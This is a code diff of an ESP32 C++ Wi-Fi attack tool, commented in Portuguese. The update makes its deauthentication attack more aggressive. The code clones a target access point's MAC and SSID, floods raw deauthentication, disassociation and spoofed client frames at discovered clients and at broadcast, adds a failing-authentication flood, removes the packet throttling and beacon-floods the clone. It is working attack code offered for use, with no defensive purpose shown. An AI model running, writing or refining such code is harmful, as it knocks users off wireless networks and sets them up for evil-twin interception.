@@ -1,12 +1,12 @@
 // ============================================================
-// wifi_attacks.cpp - CORRIGIDO v3.2
+// wifi_attacks.cpp - CORRIGIDO v3.3
 // FIXES:
 // 1. Todos os frames saem pela WIFI_IF_AP (canal travado do alvo)
-// 2. Remove uso de WIFI_IF_STA durante ataque (evita leak pra outros canais)
-// 3. Burst mais agressivo: sem throttle interno, controlado pelo menuLoop
-// 4. Channel lock antes de CADA burst com verificacao
-// 5. Modo AP puro durante ataque (sem STA scanando em background)
-// 6. delayMicroseconds entre pacotes para nao saturar o ESP32
+// 2. Modo AP puro durante ataque (sem STA scanando em background)
+// 3. deauthLoop() SEM throttle - burst a cada chamada
+// 4. Channel lock antes de CADA burst
+// 5. Burst mais denso: mais repeticoes por cliente
+// 6. Auth flood adicionado para forcar reassociacao
 // ============================================================
 #include <WiFi.h>
 #include <esp_wifi.h>
@@ -134,9 +134,6 @@ static void stopPromiscuous() {
 // ============================================================
 static uint16_t deauthSeqNum = 0;
 
-// Envia frame 802.11 raw pela interface AP (WIFI_IF_AP)
-// A interface AP esta no canal do alvo (cloneChannel), entao
-// TODOS os pacotes saem no canal correto.
 static bool raw_tx(const uint8_t* frame, size_t len) {
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
     if (err == ESP_OK) {
@@ -179,6 +176,24 @@ static void buildDisassocFrame(uint8_t* frame, const uint8_t* da, const uint8_t*
     frame[25] = 0x00;
 }
 
+static void buildAuthFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint16_t status) {
+    memset(frame, 0, 30);
+    frame[0] = 0xB0; // Auth
+    frame[1] = 0x00;
+    frame[2] = 0x00;
+    frame[3] = 0x00;
+    memcpy(&frame[4], da, 6);
+    memcpy(&frame[10], sa, 6);
+    memcpy(&frame[16], bssid, 6);
+    frame[22] = (deauthSeqNum << 4) & 0xFF;
+    frame[23] = (deauthSeqNum >> 4) & 0xFF;
+    deauthSeqNum++;
+    frame[24] = 0x00; // Auth algorithm: Open System
+    frame[25] = 0x00;
+    frame[26] = status & 0xFF; // Status code
+    frame[27] = (status >> 8) & 0xFF;
+}
+
 static void sendBeaconFrame(const uint8_t* bssid, const char* ssid) {
     uint8_t beacon[128];
     memset(beacon, 0, 128);
@@ -205,56 +220,44 @@ static void sendBeaconFrame(const uint8_t* bssid, const char* ssid) {
 }
 
 // ============================================================
-// BURST DE DEAUTH - AGRESSIVO
-// Envia deauth bidirecional para cada cliente + broadcast
-// TUDO pela interface AP (canal travado)
+// BURST DE DEAUTH - AGRESSIVO SEM THROTTLE
 // ============================================================
 static void deauthBurst() {
-    uint8_t frame[26];
+    uint8_t frame[32];
     const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-    // 1. Deauth AP -> Cliente (para cada cliente descoberto)
+    // 1. Deauth AP -> Cliente (3x por cliente, reasons diferentes)
     for (int i = 0; i < clientCount; i++) {
-        // Deauth reason 7: Class 3 frame received from nonassociated STA
-        buildDeauthFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x07);
-        raw_tx(frame, 26);
-        delayMicroseconds(50);
-
-        // Deauth reason 1: Unspecified reason
-        buildDeauthFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x01);
-        raw_tx(frame, 26);
-        delayMicroseconds(50);
-
-        // Disassoc reason 8: Disassociated because STA is leaving
+        for (int r = 0; r < 3; r++) {
+            uint8_t reason = (r == 0) ? 0x07 : (r == 1) ? 0x01 : 0x02;
+            buildDeauthFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, reason);
+            raw_tx(frame, 26);
+        }
+        // Disassoc
         buildDisassocFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x08);
         raw_tx(frame, 26);
-        delayMicroseconds(50);
+        // Auth flood com status de falha (forca o cliente a reprocessar)
+        buildAuthFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x0001);
+        raw_tx(frame, 30);
     }
 
-    // 2. Deauth Cliente -> AP (spoofando MAC do cliente, mas enviando pela AP!)
-    // O frame tem SA=cliente, DA=BSSID. Como enviamos pela interface AP,
-    // o pacote sai no canal do clone (canal do alvo). O AP recebe como se
-    // viesse do cliente.
+    // 2. Deauth Cliente -> AP (spoofando MAC do cliente)
     for (int i = 0; i < clientCount; i++) {
-        buildDeauthFrame(frame, deauthTargetBSSID, discoveredClients[i], deauthTargetBSSID, 0x07);
-        raw_tx(frame, 26);
-        delayMicroseconds(50);
-
-        buildDeauthFrame(frame, deauthTargetBSSID, discoveredClients[i], deauthTargetBSSID, 0x01);
-        raw_tx(frame, 26);
-        delayMicroseconds(50);
+        for (int r = 0; r < 2; r++) {
+            uint8_t reason = (r == 0) ? 0x07 : 0x01;
+            buildDeauthFrame(frame, deauthTargetBSSID, discoveredClients[i], deauthTargetBSSID, reason);
+            raw_tx(frame, 26);
+        }
     }
 
-    // 3. Broadcast deauth (para clientes ainda nao descobertos)
-    buildDeauthFrame(frame, broadcast, deauthTargetBSSID, deauthTargetBSSID, 0x07);
-    raw_tx(frame, 26);
-    delayMicroseconds(50);
+    // 3. Broadcast deauth (para clientes nao descobertos)
+    for (int r = 0; r < 3; r++) {
+        uint8_t reason = (r == 0) ? 0x07 : (r == 1) ? 0x01 : 0x04;
+        buildDeauthFrame(frame, broadcast, deauthTargetBSSID, deauthTargetBSSID, reason);
+        raw_tx(frame, 26);
+    }
 
-    buildDeauthFrame(frame, broadcast, deauthTargetBSSID, deauthTargetBSSID, 0x01);
-    raw_tx(frame, 26);
-    delayMicroseconds(50);
-
-    // 4. Beacon flood para manter o clone visivel
+    // 4. Beacon flood
     sendBeaconFrame(deauthTargetBSSID, deauthTargetSSID);
 }
 
@@ -328,18 +331,14 @@ static void startBssidClone(uint8_t networkIndex) {
         target->bssid[0], target->bssid[1], target->bssid[2],
         target->bssid[3], target->bssid[4], target->bssid[5]);
 
-    // Desliga tudo
     WiFi.softAPdisconnect(true);
     WiFi.disconnect(true);
     WiFi.mode(WIFI_OFF);
     delay(1000);
 
-    // CORRECAO: usa AP puro, nao AP_STA
-    // AP_STA deixa a STA livre para scanar em background e mudar de canal
     WiFi.mode(WIFI_AP);
     delay(300);
 
-    // Set AP MAC = target BSSID
     esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
     Serial.printf("[Clone] Set AP MAC: %d (%s)\n", apMacErr, apMacErr == ESP_OK ? "OK" : "FAIL");
     delay(100);
@@ -446,28 +445,22 @@ void stopDeauth() {
 }
 
 // ============================================================
-// LOOP DE DEAUTH
-// Sem throttle interno - o menuLoop controla a frequencia
+// LOOP DE DEAUTH - SEM THROTTLE INTERNO
+// O menuLoop controla a frequencia via delay(1)
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    // CORRECAO CRITICA: trava o canal a CADA burst
-    // Usa WIFI_SECOND_CHAN_NONE para nao usar canal secundario (40MHz)
-    esp_err_t chErr = esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
-    if (chErr != ESP_OK) {
-        Serial.printf("[Deauth] Channel set failed: %d\n", chErr);
-    }
+    // Trava o canal a CADA burst
+    esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
 
-    // Envia o burst completo de deauth
+    // Envia o burst completo
     deauthBurst();
 
     // HEALTH CHECK a cada 3 segundos
     static unsigned long lastHealthCheck = 0;
     if (millis() - lastHealthCheck > 3000) {
         lastHealthCheck = millis();
-
-        // Re-forca o canal no health check
         esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
 
         if (!isSoftAPActive()) {
